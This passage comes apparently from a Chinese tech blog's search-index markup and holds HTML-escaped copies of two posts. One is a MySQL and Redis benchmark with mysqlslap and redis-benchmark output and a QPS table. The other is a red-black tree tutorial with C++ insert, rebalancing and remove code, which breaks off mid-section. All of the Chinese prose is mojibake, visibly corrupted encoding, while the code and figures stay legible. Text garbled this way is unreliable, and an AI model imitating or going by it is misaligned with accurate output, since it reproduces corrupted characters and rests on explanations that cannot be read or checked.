        Average number of queries per client: 500

Benchmark
        Average number of seconds to run all queries: 1.187 seconds
        Minimum number of seconds to run all queries: 1.164 seconds
        Maximum number of seconds to run all queries: 1.210 seconds
        Number of clients running queries: 50
        Average number of queries per client: 200

Benchmark
        Average number of seconds to run all queries: 1.371 seconds
        Minimum number of seconds to run all queries: 1.249 seconds
        Maximum number of seconds to run all queries: 1.493 seconds
        Number of clients running queries: 100
        Average number of queries per client: 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŒ‰å¹³å‡å€¼è®¡ç®—QPSåœ¨7293&lt;sub&gt;9233ã€‚æŒ‰æœ€å¤§æœ€å°è®¡ç®—QPSåœ¨6697&lt;/sub&gt;9560ã€‚&lt;/p&gt;
&lt;p&gt;å†è·‘ä¸ªå†™çš„ï¼š&lt;br&gt;
mysqlslap -a --concurrency=10,20,50,100 --number-of-queries=10000 --iterations=2 -uroot -p*** --auto-generate-sql-load-type=write --auto-generate-sql-unique-write-number=0 --auto-generate-sql-write-number=1 --auto-generate-sql-guid-primary&lt;/p&gt;
&lt;p&gt;è¡¨ä¸å˜ï¼Œé¢„å…ˆå†™1æ¡æ•°æ®ï¼Œå…±è®¡å†™10000æ¡æ•°æ®&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_a84af0f955fe00403048789bbe6eb3ef.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Benchmark
        Average number of seconds to run all queries: 11.773 seconds
        Minimum number of seconds to run all queries: 11.708 seconds
        Maximum number of seconds to run all queries: 11.838 seconds
        Number of clients running queries: 10
        Average number of queries per client: 1000

Benchmark
        Average number of seconds to run all queries: 7.843 seconds
        Minimum number of seconds to run all queries: 7.492 seconds
        Maximum number of seconds to run all queries: 8.194 seconds
        Number of clients running queries: 20
        Average number of queries per client: 500

Benchmark
        Average number of seconds to run all queries: 4.386 seconds
        Minimum number of seconds to run all queries: 4.363 seconds
        Maximum number of seconds to run all queries: 4.409 seconds
        Number of clients running queries: 50
        Average number of queries per client: 200

Benchmark
        Average number of seconds to run all queries: 3.289 seconds
        Minimum number of seconds to run all queries: 3.268 seconds
        Maximum number of seconds to run all queries: 3.310 seconds
        Number of clients running queries: 100
        Average number of queries per client: 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å†™çš„åœºæ™¯ä¸‹ï¼Œåè€Œæ˜¯å¤šä¸ªå¹¶å‘æ—¶QPSæ›´é«˜ã€‚QPSèŒƒå›´åœ¨849~3040ã€‚&lt;/p&gt;
&lt;h1 id=&#34;redis&#34;&gt;Redis&lt;/h1&gt;
&lt;p&gt;æµ‹è¯•å‘½ä»¤ï¼š&lt;br&gt;
redis-benchmark -c 100 -r 1000000000 -n 10000 -d 36 -q -t set,get,mset,hset&lt;br&gt;
100ä¸ªå®¢æˆ·ç«¯ï¼Œå…±10000ä¸ªæŸ¥è¯¢ï¼Œkeyçš„å¤§å°ä¸º36Byteï¼ŒèŒƒå›´æ‰©å¤§åˆ°1000000000ï¼Œåªæµ‹è¯•set,get,mset,hsetå‘½ä»¤&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_2c3a815fd5acb6098401a48094d9d39f.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;ubuntu@VM-0-7-ubuntu:~$ redis-benchmark -c 100 -r 1000000000 -n 10000 -d 36 -q -t set,get,mset,hsetSET: 46511.63 requests per secondGET: 47846.89 requests per second&lt;br&gt;
HSET: 47619.05 requests per second&lt;br&gt;
MSET (10 keys): 31152.65 requests per second&lt;/p&gt;
&lt;p&gt;å¯¹äºgetä¸setï¼ŒQPSå‡åœ¨46000ã€‚&lt;/p&gt;
&lt;h1 id=&#34;æ±‡æ€»&#34;&gt;æ±‡æ€»&lt;/h1&gt;
&lt;p&gt;æœ¬æ¬¡å¯¹ä¸¤ä¸ªæ•°æ®åº“æ€§èƒ½çš„æµ‹è¯•ä½¿ç”¨çš„ä¸åŒå·¥å…·ï¼Œä¸”ä½¿ç”¨çš„æ•°æ®ä¸åŒï¼Œä¸èƒ½å®Œå…¨æ¨ªå‘å¯¹æ¯”ï¼Œåªèƒ½åšæ•°é‡çº§ä¸Šçš„æ¯”è¾ƒï¼Œç»¼åˆç½‘ä¸Šçš„å…¶ä»–èµ„æ–™ï¼ŒMySQLè¯»çš„æ€§èƒ½å¤§çº¦æ˜¯å†™çš„2&lt;sub&gt;3å€ï¼ŒRedisè¯»å†™æ€§èƒ½ç›¸å½“ï¼Œå‡åœ¨MySQLè¯»æ€§èƒ½çš„3&lt;/sub&gt;5å€ã€‚&lt;/p&gt;
&lt;p&gt;|&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;MySQL&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;Redis&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;è¯»&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;7000~9000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;å†™&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1000~3000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">MySQLä¸Redisçš„benchmark</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_aapnau/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;æœ¬æ–‡å‚è€ƒé‚“ä¿Šè¾‰ã€Šæ•°æ®ç»“æ„ï¼ˆç¬¬3ç‰ˆï¼‰ã€‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;å®šä¹‰&#34;&gt;å®šä¹‰&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;(1) æ ‘æ ¹å§‹ç»ˆä¸ºé»‘è‰²&lt;/li&gt;
&lt;li&gt;(2) å¤–éƒ¨èŠ‚ç‚¹å‡ä¸ºé»‘è‰²&lt;/li&gt;
&lt;li&gt;(3) æŸèŠ‚ç‚¹è‹¥ä¸ºçº¢è‰²ï¼Œåˆ™å…¶å­©å­èŠ‚ç‚¹å¿…ä¸ºé»‘è‰²&lt;/li&gt;
&lt;li&gt;(4) ä»ä»»ä¸€å¤–éƒ¨èŠ‚ç‚¹åˆ°æ ¹èŠ‚ç‚¹çš„æ²¿é€”ï¼Œé»‘èŠ‚ç‚¹çš„æ•°ç›®ç›¸ç­‰ ï¼ˆé»‘å¹³è¡¡ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;çº¢é»‘æ ‘è½¬æ¢ä¸º4é˜¶bæ ‘&#34;&gt;çº¢é»‘æ ‘è½¬æ¢ä¸º4é˜¶Bæ ‘&lt;/h1&gt;
&lt;p&gt;åœ¨çº¢é»‘æ ‘ä¸­ï¼Œæ¯å½“é‡åˆ°çº¢èŠ‚ç‚¹ï¼Œå°±å°†å…¶å‘ä¸Šç§»åŠ¨åˆå¹¶åˆ°çˆ¶èŠ‚ç‚¹ï¼ˆçº¢èŠ‚ç‚¹ä¸ä¸ºæ ¹ï¼Œä¸”å…¶çˆ¶èŠ‚ç‚¹å¿…ä¸ºé»‘èŠ‚ç‚¹ï¼‰ï¼Œå³å¯è½¬æ¢ä¸ºä¸€é¢—4é˜¶Bæ ‘ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_bf51fbac882a0036fadfe92fc01b4187.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;æ’å…¥ä¸åŒçº¢ä¿®æ­£&#34;&gt;æ’å…¥ä¸åŒçº¢ä¿®æ­£&lt;/h1&gt;
&lt;p&gt;æ’å…¥åï¼Œå°†æ–°èŠ‚ç‚¹æŸ“è‰²ä¸ºçº¢è‰²ï¼Œè¿™æ—¶å¯èƒ½ä¼šç ´åè§„åˆ™ï¼ˆ3ï¼‰ï¼Œéœ€è¦è¿›è¡ŒåŒçº¢ä¿®æ­£ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; 
BinNodePosi&amp;lt;T&amp;gt; RedBlack&amp;lt;T&amp;gt;::insert ( const T&amp;amp; e ) { //å°†eæ’å…¥çº¢é»‘æ ‘
   BinNodePosi&amp;lt;T&amp;gt; &amp;amp; x = search ( e ); if ( x ) return x; //ç¡®è®¤ç›®æ ‡ä¸å­˜åœ¨ï¼ˆç•™æ„å¯¹_hotçš„è®¾ç½®ï¼‰
   x = new BinNode&amp;lt;T&amp;gt; ( e, _hot, NULL, NULL, 0 ); _size++; //åˆ›å»ºçº¢èŠ‚ç‚¹xï¼šä»¥_hotä¸ºçˆ¶ï¼Œé»‘é«˜åº¦0
   BinNodePosi&amp;lt;T&amp;gt; xOld = x; solveDoubleRed ( x ); return xOld; //ç»åŒçº¢ä¿®æ­£åï¼Œå³å¯è¿”å›
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨ä¸‹é¢ï¼Œè®¾æ’å…¥èŠ‚ç‚¹ä¸ºxï¼Œå…¶çˆ¶äº²ä¸ºpï¼Œçˆ·çˆ·ä¸ºgï¼Œpçš„å…„å¼Ÿä¸ºu&lt;/p&gt;
&lt;h2 id=&#34;çº¢çº¢-é»‘ä¿®æ­£&#34;&gt;çº¢çº¢-é»‘ä¿®æ­£&lt;/h2&gt;
&lt;p&gt;xçº¢ï¼Œpçº¢ï¼ˆgå¿…é»‘ï¼‰ï¼Œué»‘ã€‚&lt;br&gt;
åªéœ€è¦è¿›è¡Œä¸€æ¬¡å±€éƒ¨çš„3-4æ—‹è½¬ï¼Œå†å¯¹èŠ‚ç‚¹é‡æ–°æŸ“è‰²ã€‚ä¿®æ­£åé»‘é«˜åº¦æ¢å¤ï¼Œä¸”æ–°ç”Ÿæˆçš„å±€éƒ¨æ ¹èŠ‚ç‚¹ä¸ºé»‘è‰²ï¼Œä¸éœ€è¦ç»§ç»­è°ƒæ•´ï¼Œç®—æ³•ç»“æŸã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_a89fb739aec93300a132c65ad62c7caf.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;3-4æ—‹è½¬ï¼šå°†ä»»æ„å¤±è¡¡éœ€è¦æ—‹è½¬çš„ä¸‰ä¸ªèŠ‚ç‚¹ä¸ä»–ä»¬çš„å››é¢—å­æ ‘è¿›è¡Œè°ƒæ•´ï¼Œå˜æˆå¦‚ä¸‹çš„å¹³è¡¡å½¢å¼ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_65b42412b6941fbd777937ea17ed8ed8.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;// a,b,cä¸ºä¸‰ä¸ªå¾…è°ƒæ•´èŠ‚ç‚¹ï¼ŒT0~T3ä¸ºä»–ä»¬çš„å››é¢—å­æ ‘ï¼Œå‡æŒ‰ç…§ä¸­åºéå†é¡ºåºä¼ å…¥
template &amp;lt;typename T&amp;gt;
BinNodePosi&amp;lt;T&amp;gt; BST&amp;lt;T&amp;gt;::connect34(
	BinNodePosi&amp;lt;T&amp;gt; a, BinNodePosi&amp;lt;T&amp;gt; b, BinNodePosi&amp;lt;T&amp;gt; c,
	BinNodePosi&amp;lt;T&amp;gt; T0, BinNodePosi&amp;lt;T&amp;gt; T1, BinNodePosi&amp;lt;T&amp;gt; T2, BinNodePosi&amp;lt;T&amp;gt; T3
) {
	a-&amp;gt;lc = T0; if (T0) T0-&amp;gt;parent = a;
	a-&amp;gt;rc = T1; if (T1) T1-&amp;gt;parent = a; updateHeight(a);
	c-&amp;gt;lc = T2; if (T2) T2-&amp;gt;parent = c;
	c-&amp;gt;rc = T3; if (T3) T3-&amp;gt;parent = c; updateHeight(c);
	b-&amp;gt;lc = a; a-&amp;gt;parent = b;
	b-&amp;gt;rc = c; c-&amp;gt;parent = b; updateHeight(b);
	return b; //è¯¥å­æ ‘æ–°çš„æ ¹èŠ‚ç‚¹
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;çº¢çº¢-çº¢ä¿®æ­£&#34;&gt;çº¢çº¢-çº¢ä¿®æ­£&lt;/h2&gt;
&lt;p&gt;xä¸ºçº¢è‰²ï¼Œpçº¢è‰²ï¼Œuçº¢è‰²ã€‚&lt;br&gt;
ä»ç­‰æ•ˆå››é˜¶Bæ ‘çš„è§’åº¦çœ‹ï¼ŒèŠ‚ç‚¹å†…æœ‰å››ä¸ªkeyï¼Œå‘ç”Ÿäº†ä¸Šæº¢ï¼Œä¸ºäº†ä¾¿äºä¿®æ­£ï¼Œå°†gé€‰æ‹©ä¸ºå‘ä¸Šæº¢å‡ºçš„èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹å‘ä¸Šåˆå¹¶éœ€è¦æŸ“æˆçº¢è‰²ï¼Œäºæ˜¯æŠŠgçš„é»‘é«˜åº¦ä¼ ç»™ä»–çš„ä¸¤ä¸ªå„¿å­ï¼Œå°†på’ŒuæŸ“æˆé»‘è‰²ï¼Œä¿æŒäº†é»‘é«˜åº¦ä¸å˜ã€‚æ­¤æ—¶å±€éƒ¨æ ¹èŠ‚ç‚¹ä¸ºçº¢è‰²ï¼Œéœ€è¦ç»§ç»­å‘ä¸Šè¿›è¡ŒåŒçº¢ä¿®æ­£ï¼Œå½“å±€éƒ¨æ ¹èŠ‚ç‚¹ä¸ºæ•´ä¸ªRBTreeçš„æ ¹èŠ‚ç‚¹æ—¶ï¼Œå°†å…¶æŸ“é»‘ï¼Œæ ‘çš„é»‘é«˜åº¦+1ã€‚ä¸Bæ ‘ä¸€æ ·ï¼Œçº¢é»‘æ ‘ä»æ ¹ä¸Šé•¿é«˜ã€‚&lt;/p&gt;
&lt;h2 id=&#34;åŒçº¢ä¿®æ­£çš„ä»£ç &#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_4b06d620efa604e8c0fc4b0ba148a542.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;åŒçº¢ä¿®æ­£çš„ä»£ç &lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; void RedBlack&amp;lt;T&amp;gt;::solveDoubleRed ( BinNodePosi&amp;lt;T&amp;gt; x ) { //xå½“å‰å¿…ä¸ºçº¢
   if ( IsRoot ( *x ) ) //è‹¥å·²ï¼ˆé€’å½’ï¼‰è½¬è‡³æ ‘æ ¹ï¼Œåˆ™å°†å…¶è½¬é»‘ï¼Œæ•´æ ‘é»‘é«˜åº¦ä¹Ÿéšä¹‹é€’å¢
      {  _root-&amp;gt;color = RB_BLACK; _root-&amp;gt;height++; return;  } //å¦åˆ™ï¼Œxçš„çˆ¶äº²på¿…å­˜åœ¨
   BinNodePosi&amp;lt;T&amp;gt; p = x-&amp;gt;parent; if ( IsBlack ( p ) ) return; //è‹¥pä¸ºé»‘ï¼Œåˆ™å¯ç»ˆæ­¢è°ƒæ•´ã€‚å¦åˆ™
   BinNodePosi&amp;lt;T&amp;gt; g = p-&amp;gt;parent; //æ—¢ç„¶pä¸ºçº¢ï¼Œåˆ™xçš„ç¥–çˆ¶å¿…å­˜åœ¨ï¼Œä¸”å¿…ä¸ºé»‘è‰²
   BinNodePosi&amp;lt;T&amp;gt; u = uncle ( x ); //ä»¥ä¸‹ï¼Œè§†xå”çˆ¶uçš„é¢œè‰²åˆ†åˆ«å¤„ç†
    
   if ( IsBlack ( u ) ) { //uä¸ºé»‘è‰²ï¼ˆå«NULLï¼‰æ—¶ 
      if ( IsLChild ( *x ) == IsLChild ( *p ) ) //è‹¥xä¸påŒä¾§ï¼ˆå³zIg-zIgæˆ–zAg-zAgï¼‰ï¼Œåˆ™
         p-&amp;gt;color = RB_BLACK; //pç”±çº¢è½¬é»‘ï¼Œxä¿æŒçº¢
      else //è‹¥xä¸på¼‚ä¾§ï¼ˆå³zIg-zAgæˆ–zAg-zIgï¼‰ï¼Œåˆ™
         x-&amp;gt;color = RB_BLACK; //xç”±çº¢è½¬é»‘ï¼Œpä¿æŒçº¢
      g-&amp;gt;color = RB_RED; //gå¿…å®šç”±é»‘è½¬çº¢
///// ä»¥ä¸Šè™½ä¿è¯æ€»å…±ä¸¤æ¬¡æŸ“è‰²ï¼Œä½†å› å¢åŠ äº†åˆ¤æ–­è€Œå¾—ä¸å¿å¤±
///// åœ¨æ—‹è½¬åå°†æ ¹ç½®é»‘ã€å­©å­ç½®çº¢ï¼Œè™½éœ€ä¸‰æ¬¡æŸ“è‰²ä½†æ•ˆç‡æ›´é«˜
      BinNodePosi&amp;lt;T&amp;gt; gg = g-&amp;gt;parent; //æ›¾ç¥–çˆ¶ï¼ˆgreat-grand parentï¼‰
      BinNodePosi&amp;lt;T&amp;gt; r = FromParentTo ( *g ) = rotateAt ( x ); //è°ƒæ•´åçš„å­æ ‘æ ¹èŠ‚ç‚¹
      // FromParentToè·å–ä»çˆ¶èŠ‚ç‚¹æŒ‡è¿‡æ¥çš„æŒ‡é’ˆï¼ŒrotateAtè‡ªåŠ¨è¿›è¡Œ3-4æ—‹è½¬
       
      r-&amp;gt;parent = gg; //ä¸åŸæ›¾ç¥–çˆ¶è”æ¥
   } else { //è‹¥uä¸ºçº¢è‰² //*DSA*/printf(&amp;quot;  case RR-2:\n&amp;quot;);
      p-&amp;gt;color = RB_BLACK; p-&amp;gt;height++; //pç”±çº¢è½¬é»‘
      u-&amp;gt;color = RB_BLACK; u-&amp;gt;height++; //uç”±çº¢è½¬é»‘
      if ( !IsRoot ( *g ) ) g-&amp;gt;color = RB_RED; //gè‹¥éæ ¹ï¼Œåˆ™è½¬çº¢
      solveDoubleRed ( g ); //ç»§ç»­è°ƒæ•´gï¼ˆç±»ä¼¼äºå°¾é€’å½’ï¼Œå¯ä¼˜åŒ–ä¸ºè¿­ä»£å½¢å¼ï¼‰
   }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;åˆ é™¤ä¸åŒé»‘ä¿®æ­£&#34;&gt;åˆ é™¤ä¸åŒé»‘ä¿®æ­£&lt;/h1&gt;
&lt;p&gt;åˆ é™¤æ—¶ä¿è¯åˆ é™¤èŠ‚ç‚¹æ— å·¦å­©å­ï¼ˆå¦åˆ™å°†keyä¸å…¶ç›´æ¥åç»§äº¤æ¢ï¼Œç„¶åå»åˆ é™¤å…¶ç›´æ¥åç»§ï¼‰&lt;br&gt;
æ­¤æ—¶è®°è¢«åˆ é™¤èŠ‚ç‚¹ä¸º xï¼Œå…¶æ›¿ä»£èŠ‚ç‚¹ï¼ˆå³å­©å­ï¼‰ä¸º rï¼Œçˆ¶èŠ‚ç‚¹ä¸º p ã€‚&lt;/p&gt;
&lt;p&gt;è‹¥ x ä¸ºæ ¹ï¼Œåˆ™ç”¨ r æ›¿ä»£ x ï¼Œå¹¶å°† r æŸ“é»‘ï¼Œæ­¤æ—¶æ ‘çš„é»‘é«˜åº¦å‡1ã€‚&lt;/p&gt;
&lt;p&gt;å½“ x ä¸ºçº¢æ—¶ï¼ˆç”±äº x æ— å·¦å­©å­ï¼Œæ ¹æ®å®šä¹‰å…¶ä¸€å®šæ— å³å­©å­ï¼Œäºæ˜¯ä¸ºå¶å­èŠ‚ç‚¹ï¼‰ï¼Œç›´æ¥åˆ å»ç”± r æ¥æ›¿ä»£ï¼ˆå³è®¾ä¸ºNULLï¼Œé¢œè‰²ä¸ºé»‘ï¼‰ï¼Œä¸ä¼šå¯¹æ ‘çš„å¹³è¡¡æ€§é€ æˆå½±å“ã€‚&lt;/p&gt;
&lt;p&gt;å½“ x ä¸ºé»‘è‰²ï¼Œ r ä¸ºçº¢è‰²æ—¶ï¼Œç”± r æ¥ç»§æ‰¿ x çš„é»‘é«˜åº¦ï¼Œåˆ å» x ç”± r æ¥æ›¿ä»£ï¼Œå¹¶å°† r æŸ“é»‘ï¼Œå¯¹æ•°çš„é»‘é«˜åº¦æ— ä»»ä½•å½±å“ï¼Œåˆ é™¤ç»“æŸã€‚&lt;/p&gt;
&lt;p&gt;å½“ x ä¸ r å‡ä¸ºé»‘è‰²æ—¶ï¼Œéœ€è¦è¿›è¡ŒåŒé»‘è°ƒæ•´ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;template &amp;lt;typename T&amp;gt; 
bool RedBlack&amp;lt;T&amp;gt;::remove ( const T&amp;amp; e ) { //ä»çº¢é»‘æ ‘ä¸­åˆ é™¤å…³é”®ç e
   BinNodePosi&amp;lt;T&amp;gt; &amp;amp; x = search ( e ); if ( !x ) return false; //ç¡®è®¤ç›®æ ‡å­˜åœ¨ï¼ˆç•™æ„_hotçš„è®¾ç½®ï¼‰
   BinNodePosi&amp;lt;T&amp;gt; r = removeAt ( x, _hot ); if ( ! ( --_size ) ) return true; //å®æ–½åˆ é™¤
// assert: _hotæŸä¸€å­©å­åˆšè¢«åˆ é™¤ï¼Œä¸”è¢«ræ‰€æŒ‡èŠ‚ç‚¹ï¼ˆå¯èƒ½æ˜¯NULLï¼‰æ¥æ›¿ã€‚ä»¥ä¸‹æ£€æŸ¥æ˜¯å¦å¤±è¡¡ï¼Œå¹¶åšå¿…è¦è°ƒæ•´
   if ( ! _hot ) //è‹¥åˆšè¢«åˆ é™¤çš„æ˜¯æ ¹èŠ‚ç‚¹ï¼Œåˆ™å°†å…¶ç½®é»‘ï¼Œå¹¶æ›´æ–°é»‘é«˜åº¦
      { _root-&amp;gt;color = RB_BLACK; updateHeight ( _root ); return true; }
// assert: ä»¥ä¸‹ï¼ŒåŸxï¼ˆç°rï¼‰å¿…éæ ¹ï¼Œ_hotå¿…éç©º
   if ( BlackHeightUpdated ( *_hot ) ) return true; //è‹¥æ‰€æœ‰ç¥–å…ˆçš„é»‘æ·±åº¦ä¾ç„¶å¹³è¡¡ï¼Œåˆ™æ— éœ€è°ƒæ•´
   if ( IsRed ( r ) ) //å¦åˆ™ï¼Œè‹¥rä¸ºçº¢ï¼Œåˆ™åªéœ€ä»¤å…¶è½¬é»‘
      { r-&amp;gt;color = RB_BLACK; r-&amp;gt;height++; return true; }
// assert: ä»¥ä¸‹ï¼ŒåŸxï¼ˆç°rï¼‰å‡ä¸ºé»‘è‰²
   //*DSA*/printBinTree(_hot, 0, 0);
   solveDoubleBlack ( r ); return true; //ç»åŒé»‘è°ƒæ•´åè¿”å›
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_a7c134278d37ac2229f65357ef0b0848.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å›¾ä¸­wå¿…ä¸ºNULLï¼ˆé»‘è‰²ï¼‰&lt;/p&gt;
&lt;p&gt;åŒé»‘ä¿®æ­£æ—¶ï¼ŒåŸé»‘èŠ‚ç‚¹xçš„å…„å¼Ÿå¿…ç„¶éç©ºï¼ˆå¦åˆ™ä¸æ»¡è¶³é»‘å¹³è¡¡ï¼‰ï¼Œå°†å…¶è®°ä½œsï¼›x çš„çˆ¶äº²è®°ä½œpï¼Œå…¶é¢œè‰²ä¸ç¡®å®šã€‚&lt;/p&gt;
&lt;h2 id=&#34;case1é»‘é»‘-é»‘å¸¦çº¢ä¿®æ­£&#34;&gt;case1ï¼šé»‘é»‘-é»‘å¸¦çº¢ä¿®æ­£&lt;/h2&gt;
&lt;p&gt;xã€r å‡ä¸ºé»‘ï¼Œs ä¹Ÿä¸ºé»‘ï¼Œä¸” s æœ‰çº¢è‰²çš„å­©å­ tã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_ac34805c06e74a60ec5e13a78fea0343.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç”±äºå­˜åœ¨è°ƒæ•´æ—¶é€’å½’å‘ä¸Šä¼ é€’é—®é¢˜ï¼Œr å¯èƒ½ä¸ä¸º NULL&lt;/p&gt;
&lt;p&gt;æŒ‰ç…§Bæ ‘æ¥çœ‹ï¼Œx æ— å·¦å­©å­ï¼Œä¸”å³å­©å­ä¸ºé»‘è‰²ï¼Œå…¶ä¸ºä¸€ä¸ªåªæœ‰ä¸€ä¸ªkeyçš„èŠ‚ç‚¹ï¼Œå°† x åˆ é™¤åBæ ‘å‘ç”Ÿä¸‹æº¢ï¼Œè‹¥ å…¶å…„å¼Ÿ s æœ‰çº¢è‰²å­©å­ï¼Œåˆ™æŒ‰ç…§Bæ ‘æ¥çœ‹è¯¥å…„å¼ŸèŠ‚ç‚¹çš„keyè¶³å¤Ÿå€Ÿï¼Œæ•…ä»å…„å¼ŸèŠ‚ç‚¹å€Ÿä¸€ä¸ªå…³é”®å­—ã€‚&lt;br&gt;
æ­¤æ—¶æŒ‰ç…§çº¢é»‘æ ‘æ¥çœ‹ï¼Œç›¸å½“äºåœ¨ t ã€sã€ p ä¹‹é—´åšäº†ä¸€æ¬¡3-4æ—‹è½¬ã€‚æ—‹è½¬åï¼Œç”±äº s è¢«å€Ÿèµ°ï¼Œå…¶æ‰€å±Bæ ‘èŠ‚ç‚¹å¯èƒ½åªå‰©ä¸‹ä¸€ä¸ªçº¢keyï¼Œç”±äºæ­¤æ—¶Bæ ‘çš„é«˜åº¦å¹¶ä¸åº”è¯¥æ”¹å˜ï¼Œæ•…éœ€è¦è®© t ç»§æ‰¿ s çš„é»‘é«˜åº¦ï¼Œå°†å…¶æŸ“é»‘ï¼Œs åˆ™ç»§æ‰¿åŸæ¥ p çš„é¢œè‰²ï¼Œp ç»§æ‰¿åŸå±äº x çš„é»‘è‰²ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹äº t ä¸º s çš„å³å­©å­ï¼Œå¤„ç†æ–¹å¼ç±»ä¼¼ï¼Œåœ¨3-4æ—‹è½¬åç»Ÿä¸€è¿›è¡ŒæŸ“è‰²ï¼Œå¯ä»¥é¿å…å¤æ‚çš„åˆ¤æ–­ã€‚&lt;/p&gt;
&lt;h2 id=&#34;é»‘é»‘-é»‘ä¸å¸¦çº¢&#34;&gt;é»‘é»‘-é»‘ä¸å¸¦çº¢&lt;/h2&gt;
&lt;p&gt;å½“ s æ²¡æœ‰çº¢å­©å­æ—¶ï¼Œä»Bæ ‘çš„è§’åº¦æ¥çœ‹ï¼Œæ­¤æ—¶å±äºä¸‹æº¢ä¸”å…„å¼Ÿä¸å¤Ÿå€Ÿï¼Œä¾æ® p çš„é¢œè‰²åˆå¯åˆ†ä¸º2ç§æƒ…å½¢ã€‚&lt;/p&gt;
&lt;h3 id=&#34;case2p-ä¸ºçº¢&#34;&gt;case2ï¼šp ä¸ºçº¢&lt;/h3&gt;
&lt;p&gt;æ­¤æ—¶åœ¨Bæ ‘ä¸­ï¼Œpæ‰€åœ¨çš„èŠ‚ç‚¹å¿…ç„¶è¿˜æœ‰ä¸€ä¸ªé»‘è‰²çš„keyï¼Œäºæ˜¯å°†på€Ÿä¸‹æ¥æŠŠï¼Œå°† x ä¸ s ç²˜åˆåœ¨ä¸€èµ·ï¼Œä¹‹åå†å»åˆ é™¤ x&lt;br&gt;
ç”±äº p æ‰€åœ¨èŠ‚ç‚¹è¿˜æœ‰å…¶ä»–keyï¼Œæ•…å€Ÿèµ° p ä¸ä¼šå¼•èµ·å†ä¸€æ¬¡çš„ä¸‹æº¢ï¼Œè¯¥è¿‡ç¨‹ä¸éœ€è¦é€’å½’æ‰§è¡Œã€‚&lt;br&gt;
ç²˜åˆåçš„ sã€pã€x èŠ‚ç‚¹çš„keyçš„é¢œè‰²ä¸º é»‘ã€çº¢ã€é»‘ï¼Œå¹¶ä¸ç¬¦åˆçº¢é»‘æ ‘å‘Bæ ‘è½¬æ¢çš„è§„å®šï¼ˆåªæœ‰çº¢èŠ‚ç‚¹å‘ä¸Šåˆå¹¶ï¼‰ï¼Œéœ€è¦æŸ“è‰²ä¸º çº¢ã€é»‘ã€çº¢ï¼Œä¹‹åå†å»åˆ é™¤ x èŠ‚ç‚¹å’Œ x å·¦å­©å­ï¼ˆNULLï¼‰ã€‚&lt;br&gt;
è¯¥è¿‡ç¨‹ä½“ç°åœ¨çº¢é»‘æ ‘ä¸Šå°±æ˜¯å°† p æŸ“é»‘ï¼Œs æŸ“çº¢ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/%E5%9B%BE%E7%89%87_f7af30f1ebebb12bd6a12eb6d5ca8b97.png&#34; alt=&#34;å›¾ç‰‡.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;case3p-ä¸ºé»‘&#34;&gt;case3ï¼šp ä¸ºé»‘&lt;/h3&gt;
